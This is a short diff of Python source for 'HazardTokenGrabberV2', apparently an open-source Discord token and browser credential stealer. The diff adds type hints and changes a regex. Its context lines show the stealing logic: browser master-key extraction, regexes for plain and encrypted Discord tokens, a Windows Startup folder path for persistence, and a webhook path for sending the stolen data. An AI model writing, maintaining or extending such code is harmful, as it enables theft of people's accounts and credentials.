@@ -63,7 +63,7 @@ disk = str(psutil.disk_usage('/')[0] / 1024 ** 3).split(".")[0]
 
 class Functions(object):
     @staticmethod
-    def get_master_key(path) -> str:
+    def get_master_key(path: str or os.PathLike) -> str | None:
         if not ntpath.exists(path):
             return None
         with open(path, "r", encoding="utf-8") as f:
@@ -77,7 +77,7 @@ class Functions(object):
             return None
 
     @staticmethod
-    def convert_time(time):
+    def convert_time(time: int or float) -> str:
         try:
             epoch = datetime(1601, 1, 1, tzinfo=timezone.utc)
             codestamp = epoch + timedelta(microseconds=time)
@@ -171,7 +171,7 @@ class HazardTokenGrabberV2(Functions):
         self.startup_loc = ntpath.join(self.roaming, 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
 
         self.hook_reg = "api/webhooks"
-        self.chrome_reg = re.compile(r'(?:^profile\s\d*)|default|(?:guest profile$)', re.IGNORECASE | re.MULTILINE)
+        self.chrome_reg = re.compile(r'(^profile\s\d*)|default|(guest profile$)', re.IGNORECASE | re.MULTILINE)
         self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
         self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
 
